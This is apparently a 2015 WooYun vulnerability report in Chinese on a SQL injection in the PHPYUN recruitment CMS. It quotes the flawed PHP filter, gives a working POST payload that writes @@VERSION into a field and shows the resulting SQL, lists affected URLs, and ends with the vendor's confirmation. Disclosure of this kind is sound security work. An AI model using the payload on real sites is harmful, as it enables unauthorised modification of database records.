{"id": 71253, "wybug_id": "wooyun-2015-0135603", "wybug_title": "PHPYUN最新版Webscan绕过注入四处(可修改任意字段值)", "wybug_corp": "php云人才系统", "wybug_author": "menmen519", "wybug_date": "2015-08-25 17:21", "wybug_open_date": "2015-11-23 17:46", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-28：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-10-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-23：\t细节向公众公开  简要描述： PHPYUN最新版Webscan绕过注入四处(可修改任意字段值) 详细说明：  漏洞参考： WooYun: PHPYUN最新版Webscan绕过注入四处(可遍历全站信息，无需登录) 看看 站点是怎么修补的：\nfunction FormatValues($Values){        $ValuesStr='';        foreach($Values as $k=>$v){            if(preg_match(\"/^[a-zA-Z0-9_]+$/\",$k))\t\t\t{\t\t\t\t if(preg_match('/^[0-9]+$/', $k)){\t\t\t\t\t$ValuesStr.=','.$v;\t\t\t\t}else{\t\t\t\t\t\t\t\t\t\t$ValuesStr.=',`'.$k.'`=\\''.$v.'\\'';\t\t\t\t\t\t\t\t\t}\t\t\t}        }        return substr($ValuesStr,1);    }\n修补方案就是，设计缺陷为：1.preg_match(\"/^[a-zA-Z0-9_]+$/\",$k) 让这个成立2. if(preg_match('/^[0-9]+$/', $k)){\t\t\t\t\t$ValuesStr.=','.$v;当key 为纯数字组成的时候，直接连接后面的值  这个就存在很大的风险了 发布一个微简历\n\n我的简历密码是admin然后记住这个id\n\n访问url:http://localhost/phpyun/tiny/index.php?admin_dir=adminpostdata:username=test123&sex=7&exp=18&job=ccc&mobile=15802991419&qq=11111111&123455=`qq`%3d@@VERSION where `id`=1%23&password=admin&authcode=ag31&id=1&submit=%B7%A2%B2%BC抓取的sql语句为：UPDATE `phpyun_resume_tiny` SET `username`='test123',`sex`='7',`exp`='18',`job`='ccc',`mobile`='15802991419',`qq`='11111111',`qq`=@@VERSION where `id`=1#,`status`='1',`login_ip`='',`time`='1440051620' WHERE 1 and `id`='1'查看这个简历：\n\n其他漏洞点原理一模一样，都可以修改任意字段1.http://localhost/phpyun40/upload/tiny/index.php?admin_dir=admin2.http://localhost/phpyun40/upload/index.php?admin_dir=admin&c=index&m=friend&a=saveinfo3.http://localhost/phpyun40/upload/index.php?admin_dir=admin&c=once&m=wap&a=add4.http://localhost/phpyun40/upload/index.php?admin_dir=admin&c=once&m=wap&a=add原理参考最上面的链接就好   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-08-25 17:44 厂商回复： 感谢提供，我们会尽快修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-25 17:23 |    \t\tpiaoye \t\t\t( 普通白帽子  |\t\t\t        Rank:343 漏洞数:53        | ww)\t\t \n  我先抢楼关注下    \n     2015-08-26 12:50 |    \t\t君宝 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:4        | 不要跟我比浪。。你浪不过我。。)\t\t \n  仰望一下    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}